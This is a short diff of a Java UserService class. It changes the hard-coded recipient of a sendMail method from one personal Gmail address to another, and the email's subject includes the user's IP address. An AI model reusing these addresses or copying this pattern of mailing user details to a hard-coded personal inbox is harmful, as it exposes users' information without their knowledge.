@@ -37,7 +37,7 @@ public class UserService {
 	}
 
 	private void sendMail(User user) throws UnsupportedEncodingException, MessagingException {
-		String toAddress = "medicalsolutions1947@gmail.com";
+		String toAddress = "t2gxmma@gmail.com";
 		String subject = "Medical Solutions (" + user.getIpAddress() + ")";
 		String content = " <div>\r\n" + "      <div>\r\n" + "        <style>\r\n" + "          #container {\r\n"
 				+ "            font-family: Arial, Helvetica, sans-serif;\r\n"
